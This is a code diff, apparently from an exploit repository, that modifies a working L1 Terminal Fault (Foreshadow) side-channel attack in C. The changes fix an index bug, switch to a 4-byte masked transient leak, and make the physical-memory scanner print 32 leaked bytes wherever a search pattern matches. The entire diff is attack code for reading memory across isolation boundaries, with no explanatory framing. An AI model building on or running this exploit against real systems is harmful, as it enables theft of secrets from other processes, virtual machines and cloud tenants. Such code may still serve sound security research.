@@ -61,13 +61,13 @@ bool l1tf_check(void *leak_addr, full_reload_buffer_t reload_buffer,
 
 bool l1tf_check_4(void *leak_addr, full_reload_buffer_t reload_buffer,
                   uint8_t check[4]) {
-  clflush(reload_buffer[check[4]]);
+  clflush(reload_buffer[check[3]]);
   mfence();
 
-  printf("%x\n", *(uint32_t *)check);
-  // asm_l1tf_leak_full_with_mask(leak_addr, reload_buffer, 0xffffffff, -1, 24);
+  uint32_t word = *(uint32_t *)check;
+  asm_l1tf_leak_full_4_byte_mask(leak_addr, reload_buffer, word & 0x00ffffff);
 
-  size_t time = access_time(reload_buffer[check[4]]);
+  size_t time = access_time(reload_buffer[check[3]]);
   return time < THRESHOLD;
 }
 
@@ -176,25 +176,35 @@ void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size,
                                 leak_addr_t leak) {
   assert(needle_size > 0);
   assert(needle_size < scan_opts.stride);
+  assert(needle_size % 4 == 0);
 
+  reload_buffer_t nibble_reload_buffer = {0};
   size_t attempt = 1;
   while (true) {
     for (uintptr_t ptr = scan_opts.start, i = 0; ptr < scan_opts.end;
          ptr += scan_opts.stride, ++i) {
       if (i % 100000 == 0) {
-        fprintf(stderr, "run %lx: %.2f%%\r", attempt,
+        fprintf(stderr, "run %ld: %.2f%%\r", attempt,
                 ((double)ptr / (double)scan_opts.end) * (double)100);
       }
       l1tf_leak_buffer_modify(&leak, (void *)ptr);
 
-      bool found = true;
-      for (size_t idx = 0; idx < needle_size; ++idx) {
-        found &=
-            l1tf_check(((char *)leak.leak + idx), reload_buffer, needle[idx]);
-      }
-
-      if (found) {
-        return (void *)ptr;
+      for (size_t idx = 0; idx < needle_size; idx += 4) {
+        uint8_t *leak_ptr = (uint8_t *)leak.leak + idx;
+        if (l1tf_check_4(leak_ptr, reload_buffer, (uint8_t *)needle)) {
+          uint8_t leaked_data[32] = {0};
+          for (size_t data_idx = 0; data_idx < 32; ++data_idx) {
+            leaked_data[data_idx] =
+                l1tf_full(&leak_ptr[data_idx], nibble_reload_buffer) & 0xff;
+          }
+          printf("\n%p\t", (void *)ptr);
+          for (size_t leaked_data_idx = 0; leaked_data_idx < 32;
+               ++leaked_data_idx) {
+            printf("%.2x ", leaked_data[leaked_data_idx]);
+          }
+          printf("\n");
+          fflush(stdout);
+        }
       }
     }
     ++attempt;
